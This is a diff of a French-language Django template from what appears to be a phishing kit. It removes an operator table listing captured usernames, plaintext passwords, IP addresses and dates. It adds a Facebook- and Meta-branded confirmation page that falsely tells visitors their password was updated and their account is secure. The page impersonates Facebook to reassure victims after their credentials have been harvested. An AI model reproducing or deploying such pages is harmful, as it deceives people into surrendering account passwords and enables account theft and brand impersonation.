@@ -1,20 +1,229 @@
-<h2>Rapport des tentatives</h2>
+{% load static %}
 
-<table border="1">
-<tr>
-    <th>Identifiant</th>
-    <th>Mot de passe</th>
-    <th>IP</th>
-    <th>Date</th>
-</tr>
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<title>Facebook</title>
 
-{% for t in tentatives %}
-<tr>
-    <td>{{ t.identifiant }}</td>
-    <td>{{ t.mot_de_passe }}</td>
-    <td>{{ t.adresse_ip }}</td>
-    <td>{{ t.date }}</td>
-</tr>
-{% endfor %}
+<style>
 
-</table>
+        body {
+            font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
+        }
+        h1 {
+            font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
+        }
+
+:root {
+    --bg-color: #f3f6fb;
+    --card-bg: white;
+    --text-color: #111827;
+    --subtext-color: #6b7280;
+    --border-color: #d1d5db;
+    --primary-color: #2563eb;
+    --info-bg: #f9fafb;
+}
+
+body.dark {
+    --bg-color: #0f172a;
+    --card-bg: #1e293b;
+    --text-color: #f1f5f9;
+    --subtext-color: #94a3b8;
+    --border-color: #334155;
+    --primary-color: #3b82f6;
+    --info-bg: #1e293b;
+}
+
+body {
+    font-family: 'Segoe UI', Arial, sans-serif;
+    background: var(--bg-color);
+    margin: 0;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    transition: 0.3s ease;
+}
+
+/* Petite icône toggle */
+.theme-toggle {
+    position: absolute;
+    top: 20px;
+    right: 20px;
+    width: 38px;
+    height: 38px;
+    border-radius: 50%;
+    border: none;
+    cursor: pointer;
+    background: var(--card-bg);
+    box-shadow: 0 4px 10px rgba(0,0,0,0.15);
+    font-size: 16px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    transition: 0.3s ease;
+}
+
+.theme-toggle:hover {
+    transform: scale(1.1);
+}
+
+.container {
+    width: 420px;
+    background: var(--card-bg);
+    padding: 40px;
+    border-radius: 12px;
+    box-shadow: 0 15px 40px rgba(0,0,0,0.08);
+    transition: 0.3s ease;
+}
+
+.logo-img {
+    display: block;
+    margin: 0 auto 15px auto;
+    width: 60px;
+}
+
+h2 {
+    text-align: center;
+    margin-bottom: 8px;
+    color: var(--text-color);
+}
+
+.subtitle {
+    text-align: center;
+    font-size: 14px;
+    color: var(--subtext-color);
+    margin-bottom: 25px;
+}
+
+label {
+    font-size: 13px;
+    font-weight: 600;
+    color: var(--text-color);
+}
+
+input {
+    width: 100%;
+    padding: 11px;
+    margin-top: 6px;
+    margin-bottom: 18px;
+    border-radius: 6px;
+    border: 1px solid var(--border-color);
+    font-size: 14px;
+    background: transparent;
+    color: var(--text-color);
+}
+
+input:focus {
+    border-color: var(--primary-color);
+    outline: none;
+    box-shadow: 0 0 0 2px rgba(37,99,235,0.2);
+}
+
+.info-box {
+    background: var(--info-bg);
+    padding: 12px;
+    border-left: 4px solid var(--primary-color);
+    font-size: 12px;
+    margin-bottom: 20px;
+    color: var(--text-color);
+}
+
+button.submit-btn {
+    width: 100%;
+    padding: 12px;
+    background: var(--primary-color);
+    border: none;
+    border-radius: 6px;
+    color: white;
+    font-weight: 600;
+    font-size: 14px;
+    cursor: pointer;
+}
+
+button.submit-btn:hover {
+    opacity: 0.9;
+}
+
+.footer {
+    margin-top: 20px;
+    text-align: center;
+    font-size: 12px;
+    color: var(--subtext-color);
+}
+
+.footer a {
+    color: var(--primary-color);
+    text-decoration: none;
+}
+
+.warning {
+    margin-top: 15px;
+    font-size: 12px;
+    text-align: center;
+    color: #b45309;
+}
+
+.logo-img {
+    margin-top: 30px;   
+    width: 100px;   /* augmente cette valeur */
+}
+
+</style>
+</head>
+
+<body>
+
+<button class="theme-toggle" onclick="toggleTheme()" id="themeBtn">
+    🌙
+</button>
+
+<div class="container">
+
+
+
+<img src="{% static 'images/logo_facebook.png' %}" alt="Logo Sécurité" class="logo-img">
+
+<h2>Merci !</h2>
+<p class="subtitle">Votre mot de passe a été mis à jour avec succès et vos informations sont désormais sécurisées.</s>
+</p>
+<P class="subtitle">Vous pouvez maintenant accéder directement à votre compte Facebook.</P>
+
+<img src="{% static 'images/logo_meta.png' %}" 
+     alt="Logo Sécurité" 
+     class="logo-img">
+</div>
+
+
+<script>
+function toggleTheme() {
+    const body = document.body;
+    const button = document.getElementById("themeBtn");
+
+    body.classList.toggle("dark");
+
+    if (body.classList.contains("dark")) {
+        button.textContent = "☀️";
+        localStorage.setItem("theme", "dark");
+    } else {
+        button.textContent = "🌙";
+        localStorage.setItem("theme", "light");
+    }
+}
+
+window.onload = function() {
+    const savedTheme = localStorage.getItem("theme");
+    const button = document.getElementById("themeBtn");
+
+    if (savedTheme === "dark") {
+        document.body.classList.add("dark");
+        button.textContent = "☀️";
+    }
+}
+</script>
+
+
+
+</body>
+</html>
